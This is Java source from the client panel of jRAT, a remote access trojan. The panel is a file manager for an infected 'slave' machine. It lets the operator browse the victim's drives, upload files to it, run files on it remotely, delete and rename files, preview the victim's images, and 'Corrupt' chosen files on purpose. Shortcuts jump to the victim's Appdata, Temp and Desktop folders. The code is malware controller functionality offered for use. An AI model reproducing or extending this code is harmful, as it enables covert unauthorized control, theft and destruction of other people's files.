package se.jrat.client.ui.panels;

import java.awt.BorderLayout;
import java.awt.Desktop;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

import javax.swing.JButton;
import javax.swing.JMenu;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.event.PopupMenuEvent;
import javax.swing.event.PopupMenuListener;

import se.jrat.client.Drive;
import se.jrat.client.Main;
import se.jrat.client.Slave;
import se.jrat.client.io.FileSystem;
import se.jrat.client.listeners.DirListener;
import se.jrat.client.packets.outgoing.Packet15ListFiles;
import se.jrat.client.packets.outgoing.Packet16DeleteFile;
import se.jrat.client.packets.outgoing.Packet38RunCommand;
import se.jrat.client.packets.outgoing.Packet42ServerUploadFile;
import se.jrat.client.packets.outgoing.Packet43CreateDirectory;
import se.jrat.client.packets.outgoing.Packet47RenameFile;
import se.jrat.client.packets.outgoing.Packet64FileHash;
import se.jrat.client.packets.outgoing.Packet70CorruptFile;
import se.jrat.client.settings.StoreFileBookmarks;
import se.jrat.client.ui.components.FileTable;
import se.jrat.client.ui.frames.FramePreviewFile;
import se.jrat.client.ui.frames.FramePreviewImage;
import se.jrat.client.ui.frames.FramePreviewZip;
import se.jrat.client.ui.frames.FrameRemoteThumbView;
import se.jrat.client.utils.IconUtils;
import se.jrat.client.utils.Utils;

import com.redpois0n.oslib.OperatingSystem;

@SuppressWarnings("serial")
public class PanelRemoteFiles extends JPanel {
	
	private Slave slave;
	public RemoteFileTable remoteTable;
	
	public PanelRemoteFiles(Slave slave) {
		this.slave = slave;
		
		setLayout(new BorderLayout(0, 0));
		
		JSplitPane sp = new JSplitPane();
		
		LocalFileTable localTable = new LocalFileTable();
		sp.setLeftComponent(localTable);
		
		remoteTable = new RemoteFileTable();
		sp.setRightComponent(remoteTable);
		
		add(sp, BorderLayout.CENTER);
	}
	
	public class LocalFileTable extends FileTable {
		
		public LocalFileTable() {		
			driveComboBox.setRenderer(renderer);
			driveComboBox.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					clear();
					FileSystem.addDir(driveComboBox.getSelectedItem().toString(), tableModel, tableRenderer.icons);
				}
			});
			
			listRoots();
			
			JButton btnUpload = new JButton("Upload");
			btnUpload.setIcon(IconUtils.getIcon("arrow-up"));
			btnUpload.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent arg0) {
					new Thread() {
						public void run() {
							for (String s : getSelectedItems()) {
								File file = new File(s);
								slave.addToSendQueue(new Packet42ServerUploadFile(file, remoteTable.getCurrentDirectory() + file.getName()));
							}			
						}
					}.run();
				}				
			});
			toolBar.add(btnUpload, 0);
		}

		@Override
		public void onBack() {
			if (!getCurrentDirectory().contains(File.separator)) {
				clear();
				setDirectory(null);
				listRoots();
			} else {
				clear();
				setDirectory(getCurrentDirectory().substring(0, getCurrentDirectory().substring(0, getCurrentDirectory().length() - 1).lastIndexOf(File.separator)));
				FileSystem.addDir(getCurrentDirectory(), tableModel, tableRenderer.icons);
			}
		}

		@Override
		public void onReload() {
			clear();
			
			if (getCurrentDirectory().length() == 0) {	
				listRoots();
			} else {
				FileSystem.addDir(getCurrentDirectory(), tableModel, tableRenderer.icons);
			}
		}

		@Override
		public void onDelete() {
			String[] files = getSelectedItems();
			if (files != null) {
				for (String file : files) {
					if (Utils.yesNo("Confirm", "Confirm deleting " + file)) {
						new File(file).delete();
					}
				}
			}
		}

		@Override
		public void onCreateFolder() {
			String foldername = JOptionPane.showInputDialog(null, "Input name of folder to create", "New Folder", JOptionPane.QUESTION_MESSAGE);
			if (foldername == null) {
				return;
			}
			foldername = foldername.trim();
			new File(txtDir.getText() + File.separator + foldername).mkdirs();
		}

		@Override
		public void onItemClick(String item) {
			if (true) { // TODO
				setDirectory(item);
				clear();
				FileSystem.addDir(item, tableModel, tableRenderer.icons);
			} else {
				try {
					Desktop.getDesktop().open(new File(item));
				} catch (Exception e1) {
					e1.printStackTrace();
				}
			}
		}
		
		@Override
		public void setDirectory(String directory) {
			if (!directory.endsWith(File.separator)) {
				directory += File.separator;
			}
			
			super.setDirectory(directory);
		}
		
		public void listRoots() {
			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
				File[] f = File.listRoots();
				driveComboModel.removeAllElements();
				for (File fi : f) {
					tableRenderer.icons.put(fi.getAbsolutePath(), IconUtils.getFileIcon(fi));
					tableModel.addRow(new Object[] { fi.getAbsolutePath(), "" });
					super.renderer.addIcon(fi.getAbsolutePath().toLowerCase(), IconUtils.getFileIcon(fi));
					driveComboModel.addElement(fi.getAbsolutePath());
				}
			} else {
				onItemClick("/");
			}
		}
	}
	
	public class RemoteFileTable extends FileTable {
		
		public boolean waitingForMd5;

		public RemoteFileTable() {
			for (Drive drive : slave.getDrives()) {
				driveComboModel.addElement(drive.getName());
			}
			
			driveComboBox.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					clear();
					slave.addToSendQueue(new Packet15ListFiles(driveComboBox.getSelectedItem().toString()));
				}
			});
			
			if (slave.getOperatingSystem().getType() != OperatingSystem.WINDOWS) {
				setDirectory("/");
			} else {
				setDirectory("");
			}
						
			JButton btnDownload = new JButton("Download");
			btnDownload.setIcon(IconUtils.getIcon("arrow-down"));
			btnDownload.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent arg0) {
					
				}				
			});
			toolBar.add(btnDownload, 0);
			
			JPopupMenu popupMenuRemote = new JPopupMenu();
			addPopup(popupMenuRemote);
			
			DirListener dir = new DirListener(slave);
			
			final JMenuItem mnAdd = new JMenuItem("Add");
			mnAdd.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					StoreFileBookmarks.getGlobal().getBookmarks().add(new File(txtDir.getText()));
				}
			});
			mnAdd.setIcon(IconUtils.getIcon("bookmark-add"));
			popupMenuRemote.add(mnAdd);

			final JMenuItem mnRemove = new JMenuItem("Remove");
			mnRemove.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent e) {
					StoreFileBookmarks.getGlobal().remove(new File(txtDir.getText()));
				}
			});
			
			popupMenuRemote.addPopupMenuListener(new PopupMenuListener() {
				public void popupMenuCanceled(PopupMenuEvent arg0) {

				}

				public void popupMenuWillBecomeInvisible(PopupMenuEvent arg0) {

				}

				public void popupMenuWillBecomeVisible(PopupMenuEvent arg0) {
					File bm = new File(txtDir.getText());

					if (StoreFileBookmarks.getGlobal().contains(bm)) {
						mnAdd.setEnabled(false);
						mnRemove.setEnabled(true);
					} else {
						mnAdd.setEnabled(true);
						mnRemove.setEnabled(false);
					}
				}
			});
					
			JMenuItem mntmRun = new JMenuItem("Run");
			mntmRun.setIcon(IconUtils.getIcon("execute"));
			mntmRun.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent arg0) {
					String[] files = Utils.getFiles(table.getSelectedRows(), tableModel);;
					if (files != null) {
						for (String file : files) {
							slave.addToSendQueue(new Packet38RunCommand(file));
						}
					}
				}
			});

			JMenu mnQuickJump = new JMenu("Quick Jump");
			mnQuickJump.setIcon(IconUtils.getIcon("folder-shortcut"));
			popupMenuRemote.add(mnQuickJump);

			popupMenuRemote.addSeparator();

			JMenuItem mnRoots = new JMenuItem("Roots");
			mnQuickJump.add(mnRoots);

			JMenuItem mnAppdata = new JMenuItem("Appdata");
			mnQuickJump.add(mnAppdata);
			mnAppdata.addActionListener(dir);

			JMenuItem mnTemp = new JMenuItem("Temp");
			mnQuickJump.add(mnTemp);


			JMenuItem mnDesktop = new JMenuItem("Desktop");
			mnQuickJump.add(mnDesktop);
			mnDesktop.addActionListener(dir);
			mnTemp.addActionListener(dir);
			mnRoots.addActionListener(dir);
			popupMenuRemote.add(mntmRun);

			JMenuItem mntmPreviewFiletext = new JMenuItem("Preview file (Text, ZIP, Image)");
			mntmPreviewFiletext.setIcon(IconUtils.getIcon("preview"));
			mntmPreviewFiletext.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent arg0) {
					String[] files = getSelectedItems();
					if (files != null) {
						for (String file : files) {
							if (file.toLowerCase().endsWith(".png") || file.toLowerCase().endsWith(".jpg") || file.toLowerCase().endsWith(".jpeg") || file.toLowerCase().endsWith(".gif")) {
								FramePreviewImage frame = new FramePreviewImage(slave, file);
								frame.setVisible(true);
							} else if (file.toLowerCase().endsWith(".zip") || file.toLowerCase().endsWith(".jar")) {
								FramePreviewZip frame = new FramePreviewZip(slave, file);
								frame.setVisible(true);
							} else {
								FramePreviewFile frame = new FramePreviewFile(slave, file);
								frame.setVisible(true);
							}
						}
					}
				}
			});
			popupMenuRemote.add(mntmPreviewFiletext);

			JMenuItem mntmDownloadFile = new JMenuItem("Download File(s)");
			mntmDownloadFile.setIcon(IconUtils.getIcon("arrow-left"));
			mntmDownloadFile.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent e) {
					// TODO
				}
			});
			popupMenuRemote.add(mntmDownloadFile);

			JMenuItem mntmExploreImages = new JMenuItem("Explore(.png, .jpg, .gif)");
			mntmExploreImages.setIcon(IconUtils.getIcon("images-stack"));
			mntmExploreImages.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					List<String> files = new ArrayList<String>();
					
					String[] selectedItems = getSelectedItems();
					
					for (String str : selectedItems) {
						if (str.endsWith(".png") || str.endsWith(".gif") || str.endsWith(".jpg") || str.endsWith(".jpeg")) {
							files.add(str);
						}
					}

					if (files.size() > 0) {
						String[] paths = new String[files.size()];
						for (int i = 0; i < files.size(); i++) {
							paths[i] = files.get(i);
						}
						FrameRemoteThumbView frame = new FrameRemoteThumbView(slave, paths);
						frame.setVisible(true);
					}
				}
			});
			popupMenuRemote.add(mntmExploreImages);

			popupMenuRemote.addSeparator();

			JMenuItem mntmNewFolder = new JMenuItem("New Folder");
			mntmNewFolder.setIcon(IconUtils.getIcon("folder-add"));
			mntmNewFolder.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent e) {
					String foldername = JOptionPane.showInputDialog(null, "Input name of folder to create", "New Folder", JOptionPane.QUESTION_MESSAGE);
					if (foldername == null) {
						return;
					}
					foldername = foldername.trim();
					slave.addToSendQueue(new Packet43CreateDirectory(txtDir.getText(), foldername));
				}
			});
			popupMenuRemote.add(mntmNewFolder);

			JMenuItem mntmDelete = new JMenuItem("Delete");
			mntmDelete.setIcon(IconUtils.getIcon("delete"));
			mntmDelete.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent e) {
					onDelete();
				}
			});
			popupMenuRemote.add(mntmDelete);

			JMenuItem mntmRename = new JMenuItem("Rename");
			mntmRename.setIcon(IconUtils.getIcon("rename"));
			mntmRename.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent e) {
					String file = getSelectedItem();
					if (file != null) {
						String result = JOptionPane.showInputDialog(null, "Input file name to rename to", "Rename", JOptionPane.QUESTION_MESSAGE);
						if (result == null) {
							return;
						}
						slave.addToSendQueue(new Packet47RenameFile(file, result.trim()));
					}
				}
			});
			popupMenuRemote.add(mntmRename);

			JMenuItem mntmMdHash = new JMenuItem("File Hash");
			mntmMdHash.setIcon(IconUtils.getIcon("barcode"));
			mntmMdHash.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent arg0) {
					String file = tableModel.getValueAt(table.getSelectedRow(), 0).toString();
					if (file != null) {
						slave.addToSendQueue(new Packet64FileHash(file));
						waitingForMd5 = true;
					}
				}
			});
			popupMenuRemote.add(mntmMdHash);

			JMenuItem mntmCorrupt = new JMenuItem("Corrupt");
			mntmCorrupt.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					String file = tableModel.getValueAt(table.getSelectedRow(), 0).toString();
					if (file != null) {
						slave.addToSendQueue(new Packet70CorruptFile(file));
					}
				}
			});
			mntmCorrupt.setIcon(IconUtils.getIcon("broken_document"));
			popupMenuRemote.add(mntmCorrupt);

			popupMenuRemote.addSeparator();

			JMenu mnBookmarks = new JMenu("Bookmarks");
			mnBookmarks.setIcon(IconUtils.getIcon("bookmark-go"));
			popupMenuRemote.add(mnBookmarks);
			
			mnRemove.setIcon(IconUtils.getIcon("bookmark-remove"));
			popupMenuRemote.add(mnRemove);

			popupMenuRemote.addSeparator();

			JMenuItem mntmSelectAllFolders = new JMenuItem("Select all folders");
			mntmSelectAllFolders.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					int row = 0;
					for (int i = 0; i < tableModel.getRowCount(); i++) {
						String val = tableModel.getValueAt(i, 0).toString();
						Main.debug(val);
						if (val.substring(val.lastIndexOf(slave.getFileSeparator()), val.length()).contains(".")) {
							row = i - 1;
							break;
						}
					}
					table.getSelectionModel().setSelectionInterval(0, row);
				}
			});
			mntmSelectAllFolders.setIcon(IconUtils.getIcon("folders-stack"));
			popupMenuRemote.add(mntmSelectAllFolders);

			JMenuItem mntmSelectAllFiles = new JMenuItem("Select all files");
			mntmSelectAllFiles.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent e) {
					int row = 0;
					for (int i = 0; i < tableModel.getRowCount(); i++) {
						String val = tableModel.getValueAt(i, 0).toString();
						Main.debug(val);
						if (val.substring(val.lastIndexOf(slave.getFileSeparator()), val.length()).contains(".")) {
							row = i - 1;
							break;
						}
					}
					table.getSelectionModel().setSelectionInterval(row, tableModel.getRowCount());
				}
			});
			mntmSelectAllFiles.setIcon(IconUtils.getIcon("documents-stack"));
			popupMenuRemote.add(mntmSelectAllFiles);

			popupMenuRemote.addSeparator();

			JMenuItem mntmGo = new JMenuItem("Go");
			mntmGo.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent e) {
					// TODO
				}
			});
			mntmGo.setIcon(IconUtils.getIcon("arrow-right"));
			popupMenuRemote.add(mntmGo);

			JMenuItem mntmBack = new JMenuItem("Back");
			mntmBack.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent e) {
					// TODO
				}
			});
			mntmBack.setIcon(IconUtils.getIcon("arrow-left"));
			popupMenuRemote.add(mntmBack);

			JMenuItem mntmRefresh = new JMenuItem("Refresh");
			mntmRefresh.addActionListener(new ActionListener() {
				@Override
				public void actionPerformed(ActionEvent e) {
					while (tableModel.getRowCount() > 0) {
						tableModel.removeRow(0);
					}
					slave.addToSendQueue(new Packet15ListFiles(txtDir.getText()));
				}
			});
			mntmRefresh.setIcon(IconUtils.getIcon("refresh"));
			popupMenuRemote.add(mntmRefresh);
		}

		@Override
		public void onBack() {
			clear();
			
			if (!getCurrentDirectory().contains(slave.getFileSeparator())) {
				setDirectory(null);
			} else {
				setDirectory(getCurrentDirectory().substring(0, getCurrentDirectory().substring(0, getCurrentDirectory().length() - 1).lastIndexOf(slave.getFileSeparator())));
			}
		}

		@Override
		public void onReload() {
			clear();
			slave.addToSendQueue(new Packet15ListFiles(getCurrentDirectory()));
		}

		@Override
		public void onDelete() {
			String[] files = getSelectedItems();
			if (files != null) {
				for (String file : files) {
					if (Utils.yesNo("Confirm", "Confirm deleting " + file)) {
						slave.addToSendQueue(new Packet16DeleteFile(file));
					}
				}
			}
		}

		@Override
		public void onCreateFolder() {
			String foldername = JOptionPane.showInputDialog(null, "Input name of folder to create", "New Folder", JOptionPane.QUESTION_MESSAGE);
			if (foldername == null) {
				return;
			}
			foldername = foldername.trim();
			slave.addToSendQueue(new Packet43CreateDirectory(getCurrentDirectory(), foldername));
		}

		@Override
		public void onItemClick(String item) {
			clear();
			setDirectory(item);
		}
		
		@Override
		public void setDirectory(String directory) {
			if (directory == null) {
				directory = "";
			}
			
			String c = slave.getFileSeparator();

			if (!directory.endsWith(c)) {
				directory += c;
			}
			
			slave.addToSendQueue(new Packet15ListFiles(directory));
			super.setDirectory(directory);
		}
	}

}
